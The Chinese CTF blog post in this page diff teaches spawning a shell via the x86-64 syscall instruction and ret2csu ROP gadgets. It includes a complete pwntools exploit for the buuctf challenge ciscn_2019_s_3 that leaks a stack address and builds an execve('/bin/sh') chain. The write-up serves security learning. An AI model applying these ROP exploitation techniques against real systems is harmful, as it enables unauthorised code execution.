@@ -1,0 +1,251 @@
+<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0,viewport-fit=cover"><title>系统调用 | xia0ji233's blog</title><meta name="author" content="xia0ji233"><meta name="copyright" content="xia0ji233"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="today新的知识又增长了，发现了getshell的另一种方式：syscall和srop。故事还要源于…(此处省略万字输出)">
+<meta property="og:type" content="article">
+<meta property="og:title" content="系统调用">
+<meta property="og:url" content="https://xia0ji233.github.io/2021/05/22/syscall/index.html">
+<meta property="og:site_name" content="xia0ji233&#39;s blog">
+<meta property="og:description" content="today新的知识又增长了，发现了getshell的另一种方式：syscall和srop。故事还要源于…(此处省略万字输出)">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://xia0ji233.github.io/img/avatar.png">
+<meta property="article:published_time" content="2021-05-22T02:00:00.000Z">
+<meta property="article:modified_time" content="2024-04-09T05:23:09.905Z">
+<meta property="article:author" content="xia0ji233">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://xia0ji233.github.io/img/avatar.png"><link rel="shortcut icon" href="/img/favicon.png"><link rel="canonical" href="https://xia0ji233.github.io/2021/05/22/syscall/index.html"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css?v=4.13.0"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@6.5.1/css/all.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/ui@5.0.33/dist/fancybox/fancybox.min.css" media="print" onload="this.media='all'"><script>const GLOBAL_CONFIG = {
+  root: '/',
+  algolia: undefined,
+  localSearch: {"path":"/search.xml","preload":false,"top_n_per_article":1,"unescape":false,"languages":{"hits_empty":"找不到您查询的内容：${query}","hits_stats":"共找到 ${hits} 篇文章"}},
+  translate: undefined,
+  noticeOutdate: undefined,
+  highlight: {"plugin":"highlight.js","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false},
+  copy: {
+    success: '复制成功',
+    error: '复制错误',
+    noSupport: '浏览器不支持'
+  },
+  relativeDate: {
+    homepage: false,
+    post: false
+  },
+  runtime: '天',
+  dateSuffix: {
+    just: '刚刚',
+    min: '分钟前',
+    hour: '小时前',
+    day: '天前',
+    month: '个月前'
+  },
+  copyright: undefined,
+  lightbox: 'fancybox',
+  Snackbar: undefined,
+  infinitegrid: {
+    js: 'https://cdn.jsdelivr.net/npm/@egjs/infinitegrid@4.11.1/dist/infinitegrid.min.js',
+    buttonText: '加载更多'
+  },
+  isPhotoFigcaption: false,
+  islazyload: false,
+  isAnchor: false,
+  percent: {
+    toc: true,
+    rightside: false,
+  },
+  autoDarkmode: false
+}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
+  title: '系统调用',
+  isPost: true,
+  isHome: false,
+  isHighlightShrink: false,
+  isToc: true,
+  postUpdate: '2024-04-09 13:23:09'
+}</script><script>(win=>{
+      win.saveToLocal = {
+        set: (key, value, ttl) => {
+          if (ttl === 0) return
+          const now = Date.now()
+          const expiry = now + ttl * 86400000
+          const item = {
+            value,
+            expiry
+          }
+          localStorage.setItem(key, JSON.stringify(item))
+        },
+      
+        get: key => {
+          const itemStr = localStorage.getItem(key)
+      
+          if (!itemStr) {
+            return undefined
+          }
+          const item = JSON.parse(itemStr)
+          const now = Date.now()
+      
+          if (now > item.expiry) {
+            localStorage.removeItem(key)
+            return undefined
+          }
+          return item.value
+        }
+      }
+    
+      win.getScript = (url, attr = {}) => new Promise((resolve, reject) => {
+        const script = document.createElement('script')
+        script.src = url
+        script.async = true
+        script.onerror = reject
+        script.onload = script.onreadystatechange = function() {
+          const loadState = this.readyState
+          if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+          script.onload = script.onreadystatechange = null
+          resolve()
+        }
+
+        Object.keys(attr).forEach(key => {
+          script.setAttribute(key, attr[key])
+        })
+
+        document.head.appendChild(script)
+      })
+    
+      win.getCSS = (url, id = false) => new Promise((resolve, reject) => {
+        const link = document.createElement('link')
+        link.rel = 'stylesheet'
+        link.href = url
+        if (id) link.id = id
+        link.onerror = reject
+        link.onload = link.onreadystatechange = function() {
+          const loadState = this.readyState
+          if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+          link.onload = link.onreadystatechange = null
+          resolve()
+        }
+        document.head.appendChild(link)
+      })
+    
+      win.activateDarkMode = () => {
+        document.documentElement.setAttribute('data-theme', 'dark')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
+        }
+      }
+      win.activateLightMode = () => {
+        document.documentElement.setAttribute('data-theme', 'light')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
+        }
+      }
+      const t = saveToLocal.get('theme')
+    
+        if (t === 'dark') activateDarkMode()
+        else if (t === 'light') activateLightMode()
+      
+      const asideStatus = saveToLocal.get('aside-status')
+      if (asideStatus !== undefined) {
+        if (asideStatus === 'hide') {
+          document.documentElement.classList.add('hide-aside')
+        } else {
+          document.documentElement.classList.remove('hide-aside')
+        }
+      }
+    
+      const detectApple = () => {
+        if(/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
+          document.documentElement.classList.add('apple')
+        }
+      }
+      detectApple()
+    })(window)</script><meta name="generator" content="Hexo 7.3.0"><link rel="alternate" href="/atom.xml" title="xia0ji233's blog" type="application/atom+xml">
+</head><body><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img is-center"><img src="/img/avatar.png" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="sidebar-site-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">283</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">22</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">153</div></a></div><hr class="custom-hr"/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fa fa-home"></i><span> 主页</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fa fa-heartbeat"></i><span> 关于</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fa fa-history"></i><span> 时间轴</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fa fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fa fa-bars"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page" href="/friends/"><i class="fa-fw fas fa-link"></i><span> 友链</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url('/img/backgroud.jpg')"><nav id="nav"><span id="blog-info"><a href="/" title="xia0ji233's blog"><span class="site-name">xia0ji233's blog</span></a></span><div id="menus"><div id="search-button"><a class="site-page social-icon search" href="javascript:void(0);"><i class="fas fa-search fa-fw"></i><span> 搜索</span></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fa fa-home"></i><span> 主页</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fa fa-heartbeat"></i><span> 关于</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fa fa-history"></i><span> 时间轴</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fa fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fa fa-bars"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page" href="/friends/"><i class="fa-fw fas fa-link"></i><span> 友链</span></a></div></div><div id="toggle-menu"><a class="site-page" href="javascript:void(0);"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="post-info"><h1 class="post-title">系统调用</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2021-05-22T02:00:00.000Z" title="发表于 2021-05-22 10:00:00">2021-05-22</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2024-04-09T05:23:09.905Z" title="更新于 2024-04-09 13:23:09">2024-04-09</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/ctf/">ctf</a><i class="fas fa-angle-right post-meta-separator"></i><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/ctf/re/">re</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-wordcount"><i class="far fa-file-word fa-fw post-meta-icon"></i><span class="post-meta-label">字数总计:</span><span class="word-count">2.2k</span><span class="post-meta-separator">|</span><i class="far fa-clock fa-fw post-meta-icon"></i><span class="post-meta-label">阅读时长:</span><span>8分钟</span></span><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title="系统调用"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">阅读量:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><p><code>today</code>新的知识又增长了，发现了<code>getshell</code>的另一种方式：<code>syscall</code>和<code>srop</code>。故事还要源于…(此处省略万字输出)</p>
+<span id="more"></span>
+
+<p>(note:本作者这次有点懒，没有写AT&amp;T汇编，而是一律用了intel汇编，请悉知)</p>
+<p>可能是之前汇编基础不太好吧，竟没有发现<code>syscall</code>这么好用的指令，只要再把<code>/bin/sh</code>传参就能直接打开一个shell，真是妙蛙。但是在系统调用之前要做很多的事情，诸如各类参数传递，以64位的来说，我们要先知道我们要执行的函数系统调用号为59。我也是翻过<code>libc</code>库的，发现<code>system</code>函数实现里面有一段竟然是直接执行<code>execve(&quot;/bin/sh&quot;)</code></p>
+<img src="/2021/05/22/syscall/1.png" class="">
+
+<p>实属意外了，这是在我有次反汇编<code>libc</code>库的时候发现的，我原来一直是只用<code>system</code>函数<code>getshell</code>的，没想到<code>system</code>内部是通过这样的系统调用来打开<code>shell</code>的。</p>
+<p>那这得学啊，这是基础的基础啊。</p>
+<p>这边给出一下64位Linux的各个系统调用号，这个在Linux的<code>/usr/include/asm/unistd.h </code>下有，我这里截取部分。</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">ifndef</span> _ASM_X86_UNISTD_64_H</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _ASM_X86_UNISTD_64_H 1</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_read 0</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_write 1</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_open 2</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_close 3</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_stat 4</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_fstat 5</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_lstat 6</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_poll 7</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_lseek 8</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_mmap 9</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_mprotect 10</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_munmap 11</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_brk 12</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_rt_sigaction 13</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_rt_sigprocmask 14</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_rt_sigreturn 15</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_ioctl 16</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_pread64 17</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_pwrite64 18</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_readv 19</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_writev 20</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_access 21</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_pipe 22</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_select 23</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_sched_yield 24</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_mremap 25</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_msync 26</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_mincore 27</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_madvise 28</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_shmget 29</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_shmat 30</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_shmctl 31</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_dup 32</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_dup2 33</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_pause 34</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_nanosleep 35</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_getitimer 36</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_alarm 37</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_setitimer 38</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_getpid 39</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_sendfile 40</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_socket 41</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_connect 42</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_accept 43</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_sendto 44</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_recvfrom 45</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_sendmsg 46</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_recvmsg 47</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_shutdown 48</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_bind 49</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_listen 50</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_getsockname 51</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_getpeername 52</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_socketpair 53</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_setsockopt 54</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_getsockopt 55</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_clone 56</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_fork 57</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_vfork 58</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_execve 59</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_exit 60</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_wait4 61</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_kill 62</span></span><br></pre></td></tr></table></figure>
+
+<p>emm，经过多方取证呢，发现打开shell不仅要给第一个参数传上<code>/bin/sh</code>字符串，第二第三个字符串都需要置零。64位呢前六个参数是依次给<code>rdi,rsi,rdx,rcx,r8,r9</code>这六个寄存器的。那么我们传参过程就比较艰难，注入代码首先肯定不现实，现在题目基本都是NX保护的挺到位的。所以要去程序里面寻找<code>gadget</code>，由于<code>pop %rbx</code>这个<code>gadget</code>巨难找，在实际应用要懂得变通，比如先给一个寄存器我想要的值然后再<code>mov</code>给<code>rdx</code>，有一样的效果。</p>
+<p>由此就衍生出来一个<code>return to __libc_csu_init</code>简称<code>ret2csu</code>的方法来，其实这个我个人认为没有必要单独拿出来讲，因为就是因为这个特殊的函数基本蕴含了很多时候我们需要的<code>gadget</code>才会被如此传唱的，会了基本的<code>rop</code>攻击就行，<code>ret2csu</code>的原理跟这个就一模一样。</p>
+<p>一般的payload就是</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload=fill_data+fake_rbp+(mov rax,<span class="number">59</span>)+pop_rdi+bin_sh_addr+pop_rsi+<span class="number">0</span>+pop_rdx+<span class="number">0</span></span><br></pre></td></tr></table></figure>
+
+<p>这是一般的payload，如果找不到对应的gadget，可以自己适当变通。</p>
+<h2 id="buuctf-ciscn-s-3"><a href="#buuctf-ciscn-s-3" class="headerlink" title="buuctf:ciscn_s_3"></a><a target="_blank" rel="noopener" href="https://buuoj.cn/challenges#ciscn_2019_s_3">buuctf:ciscn_s_3</a></h2><h3 id="分析程序"><a href="#分析程序" class="headerlink" title="分析程序"></a>分析程序</h3><p>64位无壳的elf程序，扔进<code>IDA</code>竟发现<code>plt</code>表只有可怜的两项，并且实用性也不大的那种。在一般的<code>ret2libc</code>中我们一般通过一个输出函数<code>(puts,write,printf)</code>来泄露地址，然而这里没有可以利用的输出函数，如果你想模仿下面输出一个<code>plt</code>表项内容也可以，不拦你，只是你费尽心思用系统调用的<code>puts</code>或者<code>write</code>为何不直接用<code>execve</code>直接<code>getshell</code>呢？所以我们就确定我们采用<code>syscall</code>的方式去<code>getshell</code>。</p>
+<h3 id="寻找漏洞"><a href="#寻找漏洞" class="headerlink" title="寻找漏洞"></a>寻找漏洞</h3><p>这一个可以说很明显的一个栈溢出漏洞了，<code>read</code> <code>0x400</code>字节的数据，且缓冲区特别小。</p>
+<h3 id="第一次溢出"><a href="#第一次溢出" class="headerlink" title="第一次溢出"></a>第一次溢出</h3><p>由于程序并未直接提供<code>/bin/sh</code>字符串，因此我们要靠自己，然后最后填上一个<code>main</code>实现二次溢出，第一次写<code>/bin/sh</code>，第二次执行<code>execve(&quot;/bin/sh&quot;)</code>。</p>
+<hr>
+<p>这里提出一点我自己的看法，我认为这个题目有点问题，vlun函数很可能存在栈不平衡的情况，理由有两点</p>
+<p>1.程序正常执行(无溢出)无法正常结束</p>
+<p>2.给<code>24</code>字节大小的数据可以直接覆盖<code>rip</code>，因为我的理解是缓冲区大小<code>16</code>字节再加上一个<code>rbp 8</code>字节应该<code>24</code>个字节才刚刚覆盖到<code>rbp</code>的位置，而无法覆盖返回地址的。</p>
+<hr>
+<p>而且由于我们要调用栈上的数据，且栈是动态的，我们无法准确得知我们写的<code>/bin/sh</code>字符串的所在位置，因此我们第一次溢出可谓是身负重担，不仅要提供<code>/bin/sh</code>字符串还要泄露栈的地址。由于程序只有下面的</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sys_write(<span class="number">1u</span>, buf, <span class="number">0x30</span>uLL);</span><br></pre></td></tr></table></figure>
+
+<p>因此我们必须通过这个函数泄露点什么。</p>
+<p>想想当时程序调用的栈帧是什么样的，什么内容是跟栈的地址有关的。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">低地址↑</span><br><span class="line">buf in vlun</span><br><span class="line"></span><br><span class="line">rbp for main</span><br><span class="line">rip for main</span><br><span class="line">rbp for main&#x27;s father function</span><br><span class="line">rip for main&#x27;s father function</span><br><span class="line">高地址↓</span><br></pre></td></tr></table></figure>
+
+<p>如此我们也可以清楚看到，首先main的rbp是肯定被我们覆盖了的(PS 虽然现在好像是没有的)，然后后面还有一个调用main函数的那个函数的rbp，那个可以确定栈的地址，能输出这个之后我们就可以开始算偏移了。</p>
+<p>gdb调试算算rbp与它们之间的偏移，这里需要注意由于栈不平衡的原因，我们需要手动调一下rip让程序不要异常退出，然后我们调试到leave指令可以观察到此时的栈。</p>
+<img src="/2021/05/22/syscall/2.png" class="">
+
+<p>在地址0x7fffffffde20的地方存了__libc_start_main函数的rbp&#x3D;0x7fffffffdf28，那么计算一下偏移就是264，当前的rsp是main函数的rsp是vlun函数的rbp，所以我们泄露出来的这个地址与vlun函数的rbp偏移了264字节，然后再有16字节的缓冲区，如果我们再缓冲区开始写入<code>/bin/sh</code>字符串的话那么偏移就有280字节的大小。</p>
+<p>然而这些应该是第二次溢出考虑的问题，这里只是分析一下泄露地址的可行性。</p>
+<p>第一次的payload比较简单</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload=<span class="string">b&#x27;/bin/sh\0&#x27;</span>*<span class="number">2</span>+p64(main)</span><br></pre></td></tr></table></figure>
+
+<p>然后接受准备接收rbp，但是在改rip的过程中发现这里还是有0x20个字节才能到rbp的，但是我能直接略过rbp覆盖rip就有点离谱，就不知道main的rbp是存在哪了，也许是存在rip后面了。这个我也不太能讲的清楚，希望有师傅明白的话能为我解答一下，感激不尽。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">p.sendline(payload)</span><br><span class="line">p.recv(<span class="number">0x20</span>)</span><br><span class="line">rbp=u64(p.recv(<span class="number">8</span>))</span><br><span class="line">bin_sh=rbp-<span class="number">280</span><span class="comment">#注意一下栈往低地址增长</span></span><br></pre></td></tr></table></figure>
+
+<p>那么第一次溢出完美的构造了<code>/bin/sh</code>字符串并且获得了它的地址。</p>
+<h3 id="第二次溢出"><a href="#第二次溢出" class="headerlink" title="第二次溢出"></a>第二次溢出</h3><p>第二次溢出要准备的东西就有点多了。</p>
+<h4 id="寻找gadget"><a href="#寻找gadget" class="headerlink" title="寻找gadget"></a>寻找gadget</h4><p>我们需要的gadget有</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">pop rax</span><br><span class="line">syscall</span><br><span class="line">pop rdi</span><br><span class="line">pop rsi</span><br><span class="line">pop rdx</span><br></pre></td></tr></table></figure>
+
+<p>经过努力的寻找我们找到了mov rax,59用于代替pop rax，syscall本来就有，pop rdi很好找，pop rsi也有，唯独就是pop rdx找不着，但是关于rbx的gadget可以看到有一个mov rdx,r13，在libc_csu_init函数有一堆的pop寄存器的操作，我们也可以很容易找到pop r13，那么pop r13和mov rdx,r13两个一结合不就是pop rdx嘛，对吧。</p>
+<p>但是需要注意的是，mov rdx,r13后面跟的并不是ret，所以在执行mov rdx,13这个gadget时候，要把rip及时地劫持回来。它运行到后面之后会执行call ptr[r12+rbx*8]，并且，rbx,rbp,r12~r15都是我们可以随意改的。</p>
+<p>rbx我们置零，r12我们放在我们payload上面的其中一个地方能让它接着执行就可以了。</p>
+<p>那么我们先写payload</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload=<span class="string">b&#x27;/bin/sh\0&#x27;</span>*<span class="number">2</span>+p64(pop_rbx_rbp)+p64(<span class="number">0</span>)*<span class="number">2</span>+p64(bin_sh+<span class="number">0x50</span>)+p64(<span class="number">0</span>)*<span class="number">3</span>+p64(mov_rdx)+p64(mov_rax)+p64(pop_rdi)+p64(bin_sh)+p64(syscall)</span><br></pre></td></tr></table></figure>
+
+<p>就是原本传给r12的偏移我用的是+0x48的，结果给报错了，反正这个题挺神奇的，就是感觉少了八字节的数据在里面但是好像又没少，希望有师傅能为我解答一下这个困惑，但是我一般遇到这种情况就偏移多8少8都试试看，如果是32位那就上下偏移4看看。</p>
+<p>最后给师傅们看看结果吧</p>
+<img src="/2021/05/22/syscall/3.png" class="">
+
+<h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p=remote(<span class="string">&#x27;node3.buuoj.cn&#x27;</span>,<span class="number">28330</span>)</span><br><span class="line">main=<span class="number">0x0004004ED</span></span><br><span class="line">mov_rax=<span class="number">0x04004E2</span></span><br><span class="line">pop_rdi=<span class="number">0x4005a3</span></span><br><span class="line">pop_rbx_rbp_r12_r13_r14_r15=<span class="number">0x40059A</span></span><br><span class="line">mov_rdxr13_call=<span class="number">0x0400580</span> </span><br><span class="line">syscall=<span class="number">0x00400517</span></span><br><span class="line"></span><br><span class="line">payload=<span class="string">b&#x27;/ban/sh\x00&#x27;</span>*<span class="number">2</span>+p64(main)</span><br><span class="line">p.send(payload)</span><br><span class="line"></span><br><span class="line">p.recv(<span class="number">0x20</span>)</span><br><span class="line">rbp=u64(p.recv(<span class="number">8</span>))</span><br><span class="line">bin_sh=rbp-<span class="number">280</span></span><br><span class="line"></span><br><span class="line">payload=<span class="string">b&#x27;/bin/sh\0/bin/sh\0&#x27;</span>+p64(pop_rbx_rbp_r12_r13_r14_r15)+p64(<span class="number">0</span>)*<span class="number">2</span>+p64(bin_sh+<span class="number">0x50</span>)+p64(<span class="number">0</span>)*<span class="number">3</span>+p64(mov_rdxr13_call)+p64(mov_rax)+p64(pop_rdi)+p64(bin_sh)+p64(syscall)</span><br><span class="line">p.send(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure></article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta"><i class="fas fa-circle-user fa-fw"></i>文章作者: </span><span class="post-copyright-info"><a href="https://xia0ji233.github.io">xia0ji233</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta"><i class="fas fa-square-arrow-up-right fa-fw"></i>文章链接: </span><span class="post-copyright-info"><a href="https://xia0ji233.github.io/2021/05/22/syscall/">https://xia0ji233.github.io/2021/05/22/syscall/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta"><i class="fas fa-circle-exclamation fa-fw"></i>版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来自 <a href="https://xia0ji233.github.io" target="_blank">xia0ji233's blog</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"></div><div class="post_share"><div class="social-share" data-image="/img/avatar.png" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.3/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.3/sharejs/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><div class="prev-post pull-left"><a href="/2021/05/22/cachelab/" title="cachelab实验报告:模拟cache的功能"><div class="cover" style="background: var(--default-bg-color)"></div><div 